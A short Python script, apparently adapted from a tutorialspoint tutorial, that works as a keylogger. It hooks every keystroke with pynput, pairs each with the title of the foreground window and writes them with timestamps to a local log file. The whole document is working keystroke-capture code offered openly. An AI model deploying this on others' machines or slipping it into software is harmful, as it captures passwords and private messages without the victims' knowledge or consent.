# https://www.tutorialspoint.com/design-a-keylogger-in-python

from pynput.keyboard import Listener
import logging
import win32gui
#import sys

logging.basicConfig(
    filename = "key_log.txt", 
    level = logging.DEBUG, 
    format = '%(asctime)s  %(message)s'
)
  
def on_press(key):
    w = win32gui
    current_window = w.GetWindowText (w.GetForegroundWindow())
    msg = str(key).ljust(18) + " \t " + str(current_window)
    print(msg)
    logging.info(msg)

with Listener(on_press = on_press) as listener:
    listener.join()
